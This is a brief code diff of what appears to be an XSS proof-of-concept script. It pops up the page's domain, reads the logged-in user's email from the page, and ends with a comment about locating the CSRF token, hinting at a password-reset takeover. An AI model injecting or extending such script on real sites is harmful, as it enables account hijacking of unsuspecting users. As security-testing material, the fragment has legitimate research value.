@@ -1,7 +1,8 @@
-const inputDisplay = document.querySelector('.input-display');
-const text = inputDisplay.textContent.trim();
-const email = text.split('\n')[0].trim();
-alert("Your email account is " + email + "will be set a new password.");
+alert(document.domain + "it's will set a new password to your account,If you have been logined.");
+var inputDisplay1 = document.querySelector('.input-display');
+var text1 = inputDisplay1?.textContent.trim();
+var email1 = text1?.split('\n')[0].trim();
+alert("Your email account is " + email1 + "will be set a new password.");
 
 
  // 查找包含csrf_token的input元素
